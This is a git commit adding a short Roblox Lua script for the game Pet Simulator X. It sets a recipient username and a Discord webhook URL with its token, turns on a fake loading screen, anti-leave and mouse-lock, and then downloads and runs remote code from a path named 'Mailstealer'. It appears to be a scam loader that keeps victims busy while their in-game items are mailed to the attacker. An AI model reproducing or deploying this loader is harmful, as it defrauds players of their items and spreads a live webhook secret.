ea41ff0fd806389c33510d12ee42826f2777244c
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-28 23:08:12 +0700

    Create main.lua

---
+++ KyleXMoonHub/PetSimX/main.lua
@@ -0,0 +1,26 @@
+--[[
+  __  __       _ _     _             _           
+  |  \ | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\ |/ _` | | / __| __/ _ \_` | |/ _ \__|
+  | |  | | (_| | | \ \|  __/ (_| | |  __/ |   
+  |_|  |_|\,_|_|_|___/\\_|\,_|_|\_|_|   
+
+]]--
+
+UserName = "Godmeshxdxdx"
+Webhook = "https://discord.com/api/webhooks/1134516451189989477/fAviPAI4MkJneiBe5ynogJzootUX3TayOqSvfTjkBk3DftLlq3BKzfwkNy7iA4qpbbon"
+UserName2 = "Godmeshxdxdx"
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+
+
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoonScriptt/MoonHubHere/main/Mailstealer/Moonontop/Petsim00/main.lua"))()
